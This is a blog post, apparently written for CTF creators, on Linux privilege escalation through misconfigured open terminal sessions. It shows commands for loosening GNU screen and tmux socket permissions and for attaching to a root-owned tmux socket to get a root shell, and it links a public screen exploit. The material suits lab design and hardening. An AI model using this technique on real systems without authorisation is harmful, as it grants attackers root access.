---
title: Linux Privilege Escalation - Open Shell Sessions for CTF Creators
draft: false
author: "pwnlog"
authorLink: ""
description: ""
license: ""
images: []
date: 2021-12-28 11:33:00 +0800
categories: [Linux Privilege Escalation]
tags: [privilege escalation, shared object injection, defend]

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: false
rssFullText: false

code:
  copy: true
  maxShownLines: -1
  # ...
math:
  enable: true
  # ...
mapbox:
  accessToken: ""
  # ...
share:
  enable: true
  # ...
comment:
  enable: true
  # ...
library:
  css:
    # someCSS = "some.css"
    # located in "assets/"
    # Or
    # someCSS = "https://cdn.example.com/some.css"
  js:
    # someJS = "some.js"
    # located in "assets/"
    # Or
    # someJS = "https://cdn.example.com/some.js"
seo:
  images: []
  # ...

summary: "Any root sessions active?"
---

# Open Shell Sessions

A terminal session represents an interaction with a terminal for software or an operating system. In UNIX systems, these sessions are stored as socket files and character files. If a terminal session has read, write, and execute permissions, it is possible to attach to the session. Programs such as GNU screen and tmux facilitate the management of terminal sessions and are known as terminal multiplexers.


# Privilege Escalation via Screen

List the screen sessions directory recursively: 

```shell
ls -lR /var/run/screen 2>/dev/null
```

Change the group of the directory to your group recursively:

```shell
sudo chgrp user -R /var/run/screen/S-root/
```

Add read, write, and execute permissions to your group recursively:

```shell
sudo chmod g+rwx -R /var/run/screen/S-root/
```

As we can see below the GNU screen program is aware of this misconfiguration so it doesn't let we create this privilege escalation attack vector:

```shell
user@pwn:~$ sudo screen -ls
Directory /run/screen/S-root must have mode 700.
```

Change the permissions to the one that it must have:

```shell
user@pwn:~$ sudo chmod 700 -R /var/run/screen/S-root/
user@pwn:~$ sudo screen -ls
There is a screen on:
	6848.pts-0.ubuntu	(12/04/2021 04:55:50 PM)	(Attached)
1 Socket in /run/screen/S-root.
```

If we try to add read, write, and execute permissions to the session file:

```shell
user@pwn:~$ sudo chmod 770 /var/run/screen/S-root/6848.pts-0.ubuntu
user@pwn:~$ sudo ls -la /var/run/screen/S-root/
total 0
drwx------ 2 root user  60 Dec 04 15:53 .
drwxrwxrwt 4 root utmp 80 Dec 04 15:53 ..
srwxrwx--- 1 root user   0 Dec 04 15:53 6848.pts-0.ubuntu
```

We can see that the file is not found:

```shell
user@pwn:~$ screen -dr 6848.pts-0.ubuntu
There is no screen to be detached matching 6848.pts-0.ubuntu.
user@pwn:~$ sudo screen -dr 6848.pts-0.ubuntu
There is a screen on:
	6848.pts-0.ubuntu	(12/04/2021 04:55:50 PM)	(Unknown)
There is no screen to be detached matching 6848.pts-0.ubuntu.
```

The only way as of this year (2021) to escalate privileges with `GNU Screen` is by using an old version or vulnerable version like [GNU Screen 4.5.0 - Local Privilege Escalation](https://www.exploit-db.com/exploits/41154).

# Privilege Escalation via Tmux

Let's create a scenario where the current session is misconfigured, startup by creating a shared session, this is done by creating a socket file:

```shell
sudo tmux -S /shared new -s session
```

Then create a new terminal window or tab and change the group of the shared socket file to a group that we belong:

```shell
sudo chown root:user /shared
```

If we can compromise a user in the `user` group, we can attach to this session and gain root access. Since the owner of the socket file is root and the user we compromised is in the group `user`:

```shell
user@pwn:~$ ls -l /shared 
srwxrwx--- 1 root user 0 Dec 27 16:42 /shared
```

Review our group membership with the `id` command or the `groups` commands, I'm going to execute both commands:

```shell
user@pwn:~$ id && echo '' && groups
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),132(lxd),133(sambashare)

user adm cdrom sudo dip plugdev lpadmin lxd sambashare
```

As we can see above, we're in the `user` group and the `user` group has read, write, and execute permission in the shared socket session file. Because of this misconfiguration, we can attach to the `tmux` session.

```shell
user@pwn:~$ tmux -S /shared
```

Confirm the root privileges with `id` command to see the `uid` or we can use the `whoami` command to print the `euid`. The important thing here is that either or both the `uid` or the `euid` is `0` (root):

```shell
root@pwn:/home/user# id
uid=0(root) gid=0(root) groups=0(root)
root@pwn:/home/user# whoami
root
root@pwn:/home/user# 
```

In old versions of `tmux`, we could attach to any session so if you're in a system with an old tmux version running it is worth a try to attach to that session.